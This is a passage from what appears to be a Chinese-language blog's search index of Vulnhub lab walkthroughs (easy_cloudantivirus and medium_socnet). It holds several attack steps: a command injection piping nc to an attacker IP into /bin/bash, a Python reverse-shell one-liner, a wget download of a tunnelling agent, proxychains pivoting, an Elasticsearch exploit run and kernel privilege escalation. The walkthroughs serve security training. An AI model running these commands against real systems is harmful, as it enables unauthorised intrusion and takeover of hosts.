src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315204008763.png" alt="image-20220315204008763"></p><p>目标机执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./update_cloudav &quot;aa | nc 192.168.31.125 23456 | /bin/bash | nc 192.168.31.125 65432&quot;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315204049352.png" alt="image-20220315204049352"></p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315203819223.png" alt="image-20220315203819223"></p><p>彩蛋</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">扫目录</span><br><span class="line">dirsearch -u http://192.168.31.14:8080/ </span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315204312378.png" alt="image-20220315204312378"></p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315204344414.png" alt="image-20220315204344414" style="zoom: 50%;"><p>大概意思是进入后台，运行服务器就可以获得PIN</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315211236563.png" alt="image-20220315211236563"></p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315211458138.png" alt="image-20220315211458138"></p><p>一个交互式控制台，能执行Python代码</p><p>总结：</p><p>web暴力破解获取密码————scanner存在命令执行————nc串联获取shell————suid提权</p><p>sql注入绕过密码进入后台————scanner存在命令执行————Python反弹shell————suid提权</p><hr><p>菜鸡打靶，大佬勿喷。如有错误，欢迎斧正。</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机之medium_socnet</title>
      <link href="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/"/>
      <url>/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">扫描网段获取目标主机arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152358188.png" alt="image-20220313152358188"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">扫描目标主机端口及服务nmap -sS -sV -sC -p- 192.168.31.52</span><br></pre></td></tr></table></figure><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152453389.png" alt="image-20220313152453389" style="zoom:80%;"><p>目标系统为Ubuntu，开放22端口，5000端口为web服务，访问目标web</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152552693.png" alt="image-20220313152552693"></p><p>一个留言版，测试了一下，不管输入什么都会显示出来，没有利用的地方</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152611878.png" alt="image-20220313152611878"></p><p>扫一下目录        dirsearch -u <a href="http://192.168.31.52:5000/">http://192.168.31.52:5000/</a></p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152638021.png" alt="image-20220313152638021"></p><p>访问admin目录</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152652704.png" alt="image-20220313152652704"></p><p>一个代码测试框，结合前面信息搜集的结果可知使用的是python2.7，接下来就是用python2反弹shell</p><p>nc监听        nc -lvnp 123456</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152708361.png" alt="image-20220313152708361"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python代码反弹shell</span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;192.168.31.125&quot;</span>,<span class="number">12345</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152818655.png" alt="image-20220313152818655"></p><p>直接root权限</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152835357.png" alt="image-20220313152835357"></p><p>这就起飞了吗？？？当然不是</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152900646.png" alt="image-20220313152900646"></p><p>ls看到Dockerfile，难道是在docker容器里，进一步排查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152932507.png" alt="image-20220313152932507"></p><p>的确是在docker容器内，获取的也是docker容器shell，并不是宿主机的shell</p><p>信息搜集一波</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153000423.png" alt="image-20220313153000423"></p><p>对外ip为：192.168.31.52        内网ip为：172.17.0.3        内网是否存在其它存活主机？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内网主机探测    for i in $(seq 1, 254); do ping -c 1 172.17.0.$i;done</span><br></pre></td></tr></table></figure><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153030619.png" alt="image-20220313153030619" style="zoom:80%;"><p>内网存活主机：172.17.0.1    172.17.0.2（已getshell）    172.17.0.3</p><p>扫描服务及端口，但外网没法访问到内网，搭建代理隧道，将getshell的172.17.0.2作为代理服务器，通过172.17.0.2去访问另外两台存活主机</p><p>使用venom搭建代理隧道</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153055250.png" alt="image-20220313153055250"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python开启web服务python2 -m SimpleHTTPServer 8888</span><br><span class="line">                        python3 -m http.server 8888</span><br><span class="line">目标主机获取文件 wget http://192.168.31.125:8888/a64</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153145468.png" alt="image-20220313153145468"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本机监听端口./admin_linux_x64 -lport 5566</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153206482.png" alt="image-20220313153206482"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">赋予文件执行权限chmod u+x a64</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153230820.png" alt="image-20220313153230820"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">连接远程主机./a64 -rhost 192.168.31.125 -rport 5566 </span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153309221.png" alt="image-20220313153309221"></p><p>创建socks隧道</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153326946.png" alt="image-20220313153326946"></p><p>配置proxychains</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153340523.png" alt="image-20220313153340523"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">端口服务探测proxychains nmap -Pn -sT -sV  172.17.0.1</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153359594.png" alt="image-20220313153359594"></p><p>也是开放22和5000端口，5000为web服务，浏览器代理访问一下</p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153425435.png" alt="image-20220313153425435" style="zoom:80%;"><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153433756.png" alt="image-20220313153433756" style="zoom:80%;"><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153445433.png" alt="image-20220313153445433" style="zoom:80%;"><p>和目标机一摸一样。再看看172.17.0.3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">端口服务探测          proxychains nmap -Pn -sT -sV  172.17.0.1</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153543463.png" alt="image-20220313153543463"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">搜索Elasticsearch漏洞searchsploit Elasticsearch</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153609581.png" alt="image-20220313153609581"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">路径/usr/share/exploitdb/exploits/linux/remote/36337.py</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行exp       proxychains python 36337.py 172.17.0.3</span><br></pre></td></tr></table></figure><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153639118.png" alt="image-20220313153639118" style="zoom:80%;"><p>获取到172.17.0.3 root权限，并且发现passwords文件夹</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153655041.png" alt="image-20220313153655041"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">破解hash     https://www.somd5.com/</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153715317.png" alt="image-20220313153715317"></p><p>ssh远程连接宿主机            ssh <a href="mailto:&#106;&#111;&#104;&#110;&#64;&#49;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#51;&#x31;&#x2e;&#53;&#50;">&#106;&#111;&#104;&#110;&#64;&#49;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#51;&#x31;&#x2e;&#53;&#50;</a></p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153727980.png" alt="image-20220313153727980"></p><p>多次测试，仅john密码正确，能登录成功</p><p>Linux提权</p><p>suid提权，没可利用的命令</p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153742684.png" alt="image-20220313153742684" style="zoom:80%;"><p>sudo提权也失败</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153904073.png" alt="image-20220313153904073"></p><p>内核比较老，可尝试溢出</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153827219.png" alt="image-20220313153827219"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">搜索提权expsearchsploit linux 3.13</span><br></pre></td></tr></table></figure><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153919942.png" alt="image-20220313153919942" style="zoom:80%;"><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153942789.png" alt="image-20220313153942789" style="zoom:80%;"><p>目标机没有安装gc，只能在本机上编译好再上传到目标机，但是查看exp发现代码还是需要调用gcc编译ofs-lib.c</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153954033.png" alt="image-20220313153954033"></p><p>删除exp中的调用ofs-lib.c这部分代码，执行编译，将编译后的文件同kali上编译好的ofs-lib.so一起上传目标执行</p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154007458.png" alt="image-20220313154007458" style="zoom:80%;"><p>编译报错，不影响</p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154021481.png" alt="image-20220313154021481" style="zoom:80%;"><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154047914.png" alt="image-20220313154047914"></p><p>同样使用python开启web服务</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154104043.png" alt="image-20220313154104043"></p><p>将两个文件都移动到&#x2F;tmp目录下并赋予exp执行权限</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154115833.png" alt="image-20220313154115833"></p><p>执行就可以获取root权限</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154134245.png" alt="image-20220313154134245"></p><p>总结</p><p>web扫目录发现&#x2F;admin  —-&gt;  python2代码测试反弹shell  —-&gt;  获取shell发现是docker容器  —-&gt;  内网探测发现其它主机  —-&gt;  venom scks代理  —-&gt;  Elasticsearch漏洞直接getshell  —-&gt;  发现passwords文件  —-&gt;  hash破解ssh远程登录  —-&gt;  溢出提权</p><hr><p>菜鸡打靶，大佬勿喷。如有错误，欢迎斧正。</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
